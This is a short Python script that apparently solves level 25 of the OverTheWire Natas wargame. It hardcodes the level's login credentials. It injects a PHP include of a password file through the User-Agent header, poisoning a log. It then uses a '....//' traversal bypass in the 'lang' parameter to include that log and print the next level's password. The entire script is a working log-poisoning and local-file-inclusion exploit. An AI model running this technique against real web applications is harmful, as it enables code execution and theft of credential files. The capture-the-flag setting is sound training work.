#!/bin/python

import requests

url = "http://natas25.natas.labs.overthewire.org"

user = "natas25"
pwd = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

sid = "something"
cookies = {"PHPSESSID" : sid}
headers = { 'User-Agent': '<? include "/etc/natas_webpass/natas26"; ?>' }
payload = "....//logs/natas25_"+sid+".log"
r = requests.get(url + "?lang=" + payload, auth=(user,pwd), cookies=cookies, headers=headers)
print r.content